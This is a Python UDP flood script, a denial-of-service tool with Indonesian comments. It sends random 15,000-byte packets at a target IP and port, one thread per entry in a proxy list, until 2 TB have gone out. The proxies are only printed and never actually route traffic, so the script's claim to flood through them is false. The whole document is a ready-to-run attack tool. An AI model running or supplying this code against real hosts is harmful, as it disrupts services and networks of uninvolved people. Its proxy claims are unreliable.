#!/usr/bin/python3
import socket
import random
import sys
import time
from threading import Thread

if len(sys.argv) != 3:
    sys.exit('Usage: python3 f.py <target_ip> <target_port>')

# Parameter
target_ip = sys.argv[1]
target_port = int(sys.argv[2])
packet_size = 15000  # Ukuran tiap paket dalam bytes
total_data = 2 * 1024 * 1024 * 1024 * 1024  # 2TB dalam bytes
total_packets = total_data // packet_size  # Total paket
proxy_file = "proxy.txt"  # File berisi daftar proxy

# Membaca daftar proxy dari file
try:
    with open(proxy_file, 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    if not proxies:
        sys.exit("Proxy file is empty.")
except FileNotFoundError:
    sys.exit(f"Proxy file '{proxy_file}' not found.")

print(f"Loaded {len(proxies)} proxies from {proxy_file}.")

# Fungsi untuk flood menggunakan proxy tertentu
def udp_flood(proxy):
    proxy_ip, proxy_port = proxy.split(":")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(packet_size)
    sent_packets = 0
    start_time = time.time()

    print(f"[INFO] Proxy {proxy_ip}:{proxy_port} started flooding {target_ip}:{target_port}.")
    while sent_packets < total_packets:
        try:
            sock.sendto(bytes_payload, (target_ip, target_port))
            sent_packets += 1

            # Laporan progres setiap 1 juta paket
            if sent_packets % 1_000_000 == 0:
                elapsed_time = time.time() - start_time
                gb_sent = (sent_packets * packet_size) / (1024 ** 3)
                print(f"[{proxy_ip}:{proxy_port}] Sent: {sent_packets} packets ({gb_sent:.2f} GB) in {elapsed_time:.2f} seconds.")
        except Exception as e:
            print(f"[ERROR] Proxy {proxy_ip}:{proxy_port} - {e}")
            break

    print(f"[DONE] Proxy {proxy_ip}:{proxy_port} completed flooding.")

# Flood menggunakan semua proxy secara paralel
threads = []
for proxy in proxies:
    thread = Thread(target=udp_flood, args=(proxy,))
    thread.start()
    threads.append(thread)

# Menunggu semua thread selesai
for thread in threads:
    thread.join()

print("DONE - 2TB Data Sent through all proxies.")
